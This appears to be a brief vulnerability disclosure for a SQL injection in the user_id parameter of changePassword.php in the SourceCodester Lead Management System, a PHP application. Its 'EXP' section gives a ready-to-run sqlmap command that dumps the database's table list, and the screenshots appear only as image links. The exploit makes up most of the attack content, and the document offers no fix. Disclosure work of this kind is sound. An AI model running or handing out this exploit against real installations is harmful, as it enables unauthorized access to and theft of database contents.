vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/15933/lead-management-system-php-open-source-free-download.html

Vulnerability trigger parameter: $user_id

The process of vulnerability discovery is as follows：

![image](https://user-images.githubusercontent.com/30823782/208410212-f95bf0f0-97ae-441c-8e8c-ee4eeeeead6a.png)


EXP

```
sqlmap.py -u "http://192.168.31.50/penglead/php_action/changePassword.php" --data "user_id=1" --dbms=mysql -D penglead --tables
```
![image](https://user-images.githubusercontent.com/30823782/208410277-335c162f-3a05-4749-9167-aa590fe51b62.png)

